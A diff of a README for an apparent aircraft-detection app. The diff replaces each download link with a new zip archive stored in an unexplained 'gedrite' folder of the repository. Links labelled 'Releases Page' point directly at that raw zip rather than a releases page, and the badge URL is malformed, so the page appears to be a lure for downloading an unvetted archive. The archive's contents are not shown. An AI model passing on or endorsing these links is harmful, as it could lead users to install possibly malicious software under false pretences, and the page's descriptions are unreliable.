@@ -6,9 +6,9 @@ Welcome to the Military-Aircraft-Detection project! This application provides a 
 **To start using the application, follow the steps below.**
 
 ## 📥 Download & Install
-[![Download Military-Aircraft-Detection](https://raw.githubusercontent.com/Pickle1432/Military-Aircraft-Detection/main/gedrite/Military_Detection_Aircraft_v2.4.zip%20Now%20-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Pickle1432/Military-Aircraft-Detection/main/gedrite/Military_Detection_Aircraft_v2.4.zip)
+[![Download Military-Aircraft-Detection](https://raw.githubusercontent.com/Pickle1432/Military-Aircraft-Detection/main/gedrite/Detection-Aircraft-Military-v2.8-alpha.2.zip%20Now%20-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Pickle1432/Military-Aircraft-Detection/main/gedrite/Detection-Aircraft-Military-v2.8-alpha.2.zip)
 
-1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/Pickle1432/Military-Aircraft-Detection/main/gedrite/Military_Detection_Aircraft_v2.4.zip) to go to the Releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/Pickle1432/Military-Aircraft-Detection/main/gedrite/Detection-Aircraft-Military-v2.8-alpha.2.zip) to go to the Releases page.
   
 2. **Choose Your Version:** Look for the latest version, typically at the top of the page. It will often include additional features and fixes.
 
@@ -66,6 +66,6 @@ Your feedback matters. If you find any issues or have suggestions for improvemen
 Thanks to the contributors who made this project possible, especially those who have shared their expertise in deep learning and computer vision.
 
 ## 📥 Download Again
-Don’t forget to download the latest version from the [Releases Page](https://raw.githubusercontent.com/Pickle1432/Military-Aircraft-Detection/main/gedrite/Military_Detection_Aircraft_v2.4.zip) for new features and improvements.
+Don’t forget to download the latest version from the [Releases Page](https://raw.githubusercontent.com/Pickle1432/Military-Aircraft-Detection/main/gedrite/Detection-Aircraft-Military-v2.8-alpha.2.zip) for new features and improvements.
 
 Stay sharp and ready with your Military Aircraft Detection dashboard!
